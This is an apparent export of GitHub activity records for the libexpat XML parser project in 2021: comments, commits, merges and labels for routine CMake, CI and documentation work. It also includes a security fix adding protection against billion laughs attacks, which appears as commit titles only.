455,IssueComment,2021-03-26 16:49:56,tbeu,unfork_merge,"Well, it is matter of taste.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/808367290"", ""author_association"": ""CONTRIBUTOR""}"
455,IssueComment,2021-03-26 16:55:47,hartwork,unfork_merge,@tbeu if I dropped the bar of exclamation marks — would that make a difference to you?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/808370732"", ""author_association"": ""MEMBER""}"
455,IssueComment,2021-03-26 17:00:18,tbeu,unfork_merge,"Sure, if there is less noise, I would appreciate it.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/808373362"", ""author_association"": ""CONTRIBUTOR""}"
455,Revise,2021-03-26 17:05:10,hartwork,unfork_merge,CMake: Be less rejective towards unsupported MSVC compilers for Conan (#454),"{""sha"": ""9fafff73cd29c2ba62bd72e14f4cd4e2fd21b4c0"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-26T15:13:20Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-26T17:05:10Z""}}"
455,IssueComment,2021-03-26 17:05:40,hartwork,unfork_merge,"> Sure, if there is less noise, I would appreciate it.

Done.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/808376603"", ""author_association"": ""MEMBER""}"
455,CrossReferenced,2021-03-26 17:46:02,Croydon,unfork_merge,Add data for expat 2.3.0,"{""reference"": {""url"": ""https://api.github.com/repos/conan-io/conan-center-index/issues/5048"", ""is_pull_request"": true}}"
455,IssueComment,2021-03-27 11:39:08,hartwork,unfork_merge,@SpaceIm good to merge?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/808719226"", ""author_association"": ""MEMBER""}"
455,ReviewApproved,2021-03-29 09:47:55,SpaceIm,unfork_merge,LGTM ???? ,"{""author_association"": ""NONE"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/455#pullrequestreview-623048937""}"
455,IssueComment,2021-03-29 12:21:52,hartwork,unfork_merge,"Cool, thank you!","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/809333195"", ""author_association"": ""MEMBER""}"
455,MergePR,2021-03-29 12:22:05,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4521181744"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/a46b210be806e22aff1dbf6779562627f8cb903f""}"
455,DeleteBranch,2021-04-05 12:47:27,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4551481895"", ""commit_url"": null}"
456,SubmitCommit,2021-04-05 16:11:22,hartwork,unfork_merge,cmake/autotools/expat.cmake: Get back in sync with CI,"{""sha"": ""bfe4b25b8019ceb962698df0078402a33c215410"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T13:35:31Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T16:11:22Z""}}"
456,SubmitCommit,2021-04-05 16:52:16,hartwork,unfork_merge,"cppcheck: Suprocess warnings of type ""objectIndex""

Report from Cppcheck 2.4.1 was:

lib/xmlparse.c:729:26: warning: The address of local variable 'entropy' might be accessed at non-zero index. [objectIndex]
      ((uint8_t *)target)[bytesWrittenTotal] = random8;
                         ^
lib/xmlparse.c:820:39: note: Address of variable taken here.
  writeRandomBytes_arc4random((void *)&entropy, sizeof(entropy));
                                      ^
lib/xmlparse.c:820:31: note: Calling function 'writeRandomBytes_arc4random', 1st argument '(void*)&entropy' value is lifetime=entropy
  writeRandomBytes_arc4random((void *)&entropy, sizeof(entropy));
                              ^
lib/xmlparse.c:729:26: note: The address of local variable 'entropy' might be accessed at non-zero index.
      ((uint8_t *)target)[bytesWrittenTotal] = random8;
                         ^
lib/xmltok.c:318:54: error: The address of local variable 'fromLim' is accessed at non-zero index. [objectIndex]
    const unsigned char prev = (unsigned char)fromLim[-1];
                                                     ^
lib/xmltok.c:369:56: note: Address of variable taken here.
    _INTERNAL_trim_to_complete_utf8_characters(*fromP, &fromLim);
                                                       ^
lib/xmltok.c:369:56: note: Calling function '_INTERNAL_trim_to_complete_utf8_characters', 2nd argument '&fromLim' value is lifetime=fromLim
    _INTERNAL_trim_to_complete_utf8_characters(*fromP, &fromLim);
                                                       ^
lib/xmltok.c:318:54: note: The address of local variable 'fromLim' is accessed at non-zero index.
    const unsigned char prev = (unsigned char)fromLim[-1];
                                                     ^","{""sha"": ""2f051a681b17b903808fb53ab9ab0e498c8af354"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T16:32:03Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T16:52:16Z""}}"
456,SubmitCommit,2021-04-05 16:52:16,hartwork,unfork_merge,Actions: Enable periodic builds,"{""sha"": ""20ea6956b5974141aae64b6a9d562ca56b317d15"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T16:10:58Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T16:52:16Z""}}"
456,OpenPR,2021-04-05 16:58:23,hartwork,unfork_merge,,
456,Labeled,2021-04-05 16:58:42,hartwork,unfork_merge,enhancement,
456,ReviewComment,2021-04-05 17:11:09,1480c1,unfork_merge,,"{""author_association"": ""NONE"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/456#pullrequestreview-628000780""}"
456,MergePR,2021-04-05 18:03:14,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4552720608"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/b99f9f510415a7dbbb68910dd15503c31636f868""}"
456,DeleteBranch,2021-04-05 18:03:54,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4552723316"", ""commit_url"": null}"
457,SubmitCommit,2021-04-05 18:05:50,hartwork,unfork_merge,autotools-cmake.yml: Split up for upcoming extension,"{""sha"": ""7b0670460197d3d96e662bcc0c5aba3bdddd703f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T13:13:23Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T18:05:50Z""}}"
457,SubmitCommit,2021-04-05 18:05:50,hartwork,unfork_merge,autotools-cmake.yml: Add check for list of exported symbols,"{""sha"": ""ad0aec0651d1ef924668c0fc6a3a7fe3a6f93945"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T13:29:18Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T18:05:50Z""}}"
457,SubmitCommit,2021-04-05 18:05:50,hartwork,unfork_merge,Autotools: Give test suite access to internal symbols,"{""sha"": ""f01a61402cd44bb0cb59db43e70309c01acc50d1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T15:23:26Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T18:05:50Z""}}"
457,Labeled,2021-04-05 18:07:57,hartwork,unfork_merge,enhancement,
457,OpenPR,2021-04-05 18:07:57,hartwork,unfork_merge,,
457,Revise,2021-04-05 19:43:57,hartwork,unfork_merge,CMake: Give test suite access to internal symbols,"{""sha"": ""b4f142967995e6480b59953e622c9582fd3b505c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T15:59:55Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T19:43:57Z""}}"
457,Revise,2021-04-05 19:44:15,hartwork,unfork_merge,Unexpose function _INTERNAL_trim_to_complete_utf8_characters (#457),"{""sha"": ""f29b48cfca6e8c5b292308322b810626b175bf6a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T14:39:06Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-05T19:44:15Z""}}"
457,MergePR,2021-04-05 20:39:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4553318062"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/a44c3dee4046d8fb411bedfc58c466cde9d72953""}"
457,DeleteBranch,2021-04-05 20:39:42,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4553318956"", ""commit_url"": null}"
457,CrossReferenced,2021-12-02 10:22:03,fuzzard,unfork_merge,[tools/depends] bump expat 2.4.1,"{""reference"": {""url"": ""https://api.github.com/repos/xbmc/xbmc/issues/20381"", ""is_pull_request"": true}}"
459,SubmitCommit,2021-04-06 17:49:28,hartwork,unfork_merge,CMake: Support absolute paths for CMAKE_INSTALL_(LIB|INCLUDE)DIR (fixes #458),"{""sha"": ""989dd1b2ca3bad4a6c0d3e63d525aa45faf9f4b1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-06T17:49:28Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-06T17:49:28Z""}}"
459,Labeled,2021-04-06 17:52:11,hartwork,unfork_merge,bug,
459,Labeled,2021-04-06 17:52:11,hartwork,unfork_merge,compilation,
459,OpenPR,2021-04-06 17:52:11,hartwork,unfork_merge,,
459,CrossReferenced,2021-04-06 19:52:59,hartwork,unfork_merge,CMake: Support absolute paths for CMAKE_INSTALL_(LIB|INCLUDE)DIR,"{""reference"": {""url"": ""https://api.github.com/repos/uriparser/uriparser/issues/114"", ""is_pull_request"": true}}"
459,ReviewApproved,2021-04-06 20:32:05,rffontenelle,unfork_merge,,"{""author_association"": ""NONE"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/459#pullrequestreview-629384049""}"
459,IssueComment,2021-04-06 20:32:23,rffontenelle,unfork_merge,Tested locally and it works,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/814419926"", ""author_association"": ""NONE""}"
459,IssueComment,2021-04-06 20:54:50,hartwork,unfork_merge,"Very nice, thank you! :pray: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/814434258"", ""author_association"": ""MEMBER""}"
459,MergePR,2021-04-06 20:55:21,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4559031068"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/c23a17cad1f171f47a7e3783806c8e249254aaf5""}"
459,DeleteBranch,2021-04-06 21:12:31,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4559095570"", ""commit_url"": null}"
459,CrossReferenced,2021-11-15 17:53:28,jansol,unfork_merge,Fix installation with absolute paths in CMAKE_INSTALL_*DIR,"{""reference"": {""url"": ""https://api.github.com/repos/google/draco/issues/769"", ""is_pull_request"": true}}"
463,SubmitCommit,2021-04-19 17:30:12,hartwork,unfork_merge,xmlwf: Extract macro XMLWF_SHIFT_ARGUMENT,"{""sha"": ""385aeb477bac9538ab2b3d5cf0e76e8c751374be"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-17T16:35:51Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-19T17:30:12Z""}}"
463,SubmitCommit,2021-04-19 17:32:29,hartwork,unfork_merge,xmlwf: Extract exit code constants,"{""sha"": ""810e240fde96da0f2c61e3c4c0a5dbf0f5998eda"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-19T16:19:44Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-19T17:32:29Z""}}"
463,OpenPR,2021-04-19 17:47:01,hartwork,unfork_merge,,
463,Labeled,2021-04-19 17:47:11,hartwork,unfork_merge,enhancement,
463,MergePR,2021-04-20 11:34:55,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4618635776"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/10d34296211f8a1b7a9ac09df0e2983eeb892569""}"
463,DeleteBranch,2021-04-25 19:54:27,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4641574645"", ""commit_url"": null}"
465,SubmitCommit,2021-04-20 08:40:13,TomasKorbar,fork_merge,"Fix reference.html badly insterted ul tag

This fix makes no visible difference but stops static code analysers
from yielding warnings about not allowed ul inside paragraph.","{""sha"": ""8f53530dea95dde0948fca80e5144072d50b9a46"", ""author"": {""name"": ""Tomas Korbar"", ""email"": ""tkorbar@redhat.com"", ""date"": ""2021-04-20T08:40:13Z""}, ""committer"": {""name"": ""Tomas Korbar"", ""email"": ""tkorbar@redhat.com"", ""date"": ""2021-04-20T08:40:13Z""}}"
465,OpenPR,2021-04-20 09:48:44,TomasKorbar,fork_merge,,
465,Labeled,2021-04-20 10:32:00,hartwork,fork_merge,enhancement,
465,RenameTitle,2021-04-20 10:32:55,hartwork,fork_merge,,"{""rename"": {""from"": ""Fix reference.html badly insterted ul tag"", ""to"": ""Fix doc/reference.html badly insterted ul tag (fixes #464)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4618350142""}"
465,RenameTitle,2021-04-20 10:33:04,hartwork,fork_merge,,"{""rename"": {""from"": ""Fix doc/reference.html badly insterted ul tag (fixes #464)"", ""to"": ""Fix doc/reference.html badly inserted ul tag (fixes #464)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4618350842""}"
465,MergePR,2021-04-20 10:34:54,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4618359638"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/49f95cf15e80d622df2f5084696e2e0d0641bd84""}"
466,Labeled,2021-04-20 23:12:01,hartwork,unfork_merge,bug,
466,Assigned,2021-04-20 23:12:01,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
466,OpenPR,2021-04-20 23:12:01,hartwork,unfork_merge,,
466,Labeled,2021-04-20 23:12:01,hartwork,unfork_merge,security,
466,CrossReferenced,2021-04-21 22:14:02,hartwork,unfork_merge,Resolve macro HAVE_EXPAT_CONFIG_H,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/467"", ""is_pull_request"": true}}"
466,RenameTitle,2021-04-23 23:25:30,hartwork,unfork_merge,,"{""rename"": {""from"": ""[CVE-2013-0340, CWE-776] Protect against billion laughs attacks"", ""to"": ""[CVE-2013-0340, CWE-776] Protect against billion laughs attacks (fixes #34)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4639188861""}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,tests: Cover billion laughs attack protection API,"{""sha"": ""e9d8f115580c3a25a9579c213f096af623dd92ce"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-26T12:52:45Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,doc/reference.html: Document billion laughs attack protection API,"{""sha"": ""899c00e613800ef973a93ce8f83b3514992f1afa"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T18:57:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,xmlwf.1: Document arguments -a and -b,"{""sha"": ""bf878495985b81731c620bbac26df79e6c98c9fd"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T16:16:14Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,tests: Cover accounting,"{""sha"": ""271efb6069c5c979545cfbe00b738184c5632b93"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-20T22:11:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,lib: Make EXPAT_ENTROPY_DEBUG consistent with other EXPAT_*_DEBUG variables,"{""sha"": ""29c3748788ff5ba0e4b14b02dfa15080177a3c8c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-19T18:39:42Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,xmlwf: Add support for custom attack protection parameters,"{""sha"": ""c6223b3b0f3d8e6a37b5775b44eeded02e9c3ea7"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-17T15:26:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,lib: Allow test suite to access raw accounting values,"{""sha"": ""8af7d22ff029796484c78a16d4c6d44a47cb5729"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-19T19:44:38Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,"lib: Address Cppcheck 2.4.1 warning ""uninitvar""","{""sha"": ""fcd0e14c3e35a56eb7ec42142a12e984fbe1b3c0"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-20T12:01:27Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,lib: Protect against billion laughs attacks (approach 3.0.21),"{""sha"": ""b1d039607d3d8a042bf0466bfcc1c0f104e353c8"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-19T19:42:51Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,"Autotools|CMake: Suppress -Wpedantic-ms-format false positives

Addresses warning:
ISO C does not support the ‘I64’ ms_printf length modifier.

It seems correct and relevant with __USE_MINGW_ANSI_STDIO, only.
And -Werror doesn't tolerate false positives...","{""sha"": ""1e053c698b7ff8f7b4cc3c7c6e9945b72c3d5286"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-20T17:01:30Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,"mass-cppcheck.sh: Suppress warning ""unknownMacro""","{""sha"": ""3120b86447defee11d11bb9e78e49311f3307324"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-20T14:29:19Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,"lib: Add prefix ""expat: "" to EXPAT_ENTROPY_DEBUG=1 stderr output","{""sha"": ""857fdc4c3bf47eb3fedcd15d3763f62727476df0"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-14T15:30:22Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:07,hartwork,unfork_merge,xmlwf: Include expat_config.h so we can check for macro XML_DTD,"{""sha"": ""65cddaa4e93263fb88261b60f97cf29f1589d038"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-18T18:17:43Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:07Z""}}"
466,Revise,2021-05-07 16:25:08,hartwork,unfork_merge,tests: Cover helper unsignedCharToPrintable,"{""sha"": ""5dbc857f47ecd6c37748ce279c6535fbbf526590"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-26T13:12:53Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:08Z""}}"
466,Revise,2021-05-07 16:25:08,hartwork,unfork_merge,Changes: Document protection against billion laughs attacks,"{""sha"": ""3f2f8786623cc3e89a1f4384715b3ad178c5ee2c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-19T13:08:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-05-07T16:25:08Z""}}"
466,MergePR,2021-05-11 12:53:22,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4727098767"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/309cd4aa4b470a3e496a5d72014148dd8a583529""}"
466,DeleteBranch,2021-05-11 13:23:32,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4727379702"", ""commit_url"": null}"
466,CrossReferenced,2021-05-14 19:26:42,hartwork,unfork_merge,Fix accounting issues,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/484"", ""is_pull_request"": true}}"
466,CrossReferenced,2021-05-23 18:35:42,hartwork,unfork_merge,[W.I.P.] Limit entity expansion to prevent DoS attacks,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/220"", ""is_pull_request"": true}}"
466,CrossReferenced,2021-05-23 18:38:20,hartwork,unfork_merge,"Find artificial limits on entity expansion (nesting depth, size, ..)","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/46"", ""is_pull_request"": false}}"
467,SubmitCommit,2021-04-21 22:11:28,hartwork,unfork_merge,Resolve macro HAVE_EXPAT_CONFIG_H,"{""sha"": ""8d1bd6ff2c09b01de9252ce4afce1ded9f4d0d7e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-21T21:35:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-21T22:11:28Z""}}"
467,OpenPR,2021-04-21 22:12:04,hartwork,unfork_merge,,
467,Labeled,2021-04-21 22:12:10,hartwork,unfork_merge,enhancement,
467,Assigned,2021-04-21 22:12:11,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
467,MergePR,2021-04-21 22:58:16,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4627635998"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/b61279a1bc101757d2581890cb59764084f51132""}"
467,DeleteBranch,2021-04-25 19:54:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4641574639"", ""commit_url"": null}"
467,CrossReferenced,2021-06-14 16:04:36,hartwork,unfork_merge,How to use expat for embedded processors,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/499"", ""is_pull_request"": false}}"
467,CrossReferenced,2021-08-23 18:14:53,hartwork,unfork_merge,Windows Expat 2.4.x does not build with Apache,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/508"", ""is_pull_request"": false}}"
468,Labeled,2021-04-25 15:29:54,hartwork,unfork_merge,enhancement,
468,OpenPR,2021-04-25 15:29:54,hartwork,unfork_merge,,
468,Revise,2021-04-25 15:49:21,hartwork,unfork_merge,xmlwf: Simplify synopsis,"{""sha"": ""c028d9b280d61308610fa9acdf3bc1894cd985fa"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T15:14:54Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T15:49:21Z""}}"
468,MergePR,2021-04-25 17:01:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4641399327"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/724cd4eeab316d829da50c199ead234d986789af""}"
468,DeleteBranch,2021-04-25 19:54:27,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4641574656"", ""commit_url"": null}"
468,CrossReferenced,2021-05-07 15:12:11,hartwork,unfork_merge,Make CI ensure well-formed and valid XML in our XML-based documentation,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/477"", ""is_pull_request"": true}}"
469,SubmitCommit,2021-04-25 17:10:51,hartwork,unfork_merge,xmlwf.1: Add <replaceable> where missing,"{""sha"": ""1613b6ed1fcce49e49d1475b35775cd1038b5d26"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T15:41:37Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:10:51Z""}}"
469,SubmitCommit,2021-04-25 17:10:51,hartwork,unfork_merge,xmlwf.1: Pull colon out of <emphasis>,"{""sha"": ""83f12b5627d8f3cbc9be287c860878d19e03b4d8"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T16:15:14Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:10:51Z""}}"
469,SubmitCommit,2021-04-25 17:10:51,hartwork,unfork_merge,xmlwf.1: Move argument -k in place with regard to alphabetic order,"{""sha"": ""0d21b17b2cb08ba8b202abf7ebe6af95d20d4d73"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T16:29:12Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-04-25T17:10:51Z""}}"
